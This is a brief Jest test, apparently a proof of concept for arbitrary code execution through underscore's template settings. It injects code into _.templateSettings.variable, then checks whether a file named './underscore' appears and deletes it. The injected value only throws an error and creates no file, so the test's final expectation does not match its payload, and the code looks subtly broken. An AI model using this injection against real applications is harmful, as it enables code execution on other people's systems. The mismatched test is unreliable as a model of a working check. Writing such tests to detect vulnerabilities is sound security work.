test("Arbitrary code execution in underscore", () => {
  expect.assertions(2);
  const fs = require("fs");
  const _ = require("underscore");
  const path = "./underscore";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    _.templateSettings.variable =
        "a = throw new Error()";
    const t = _.template("")();
  } catch (error) {
    console.log("Start Error")
    console.log(error)
    console.log("End Error");
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
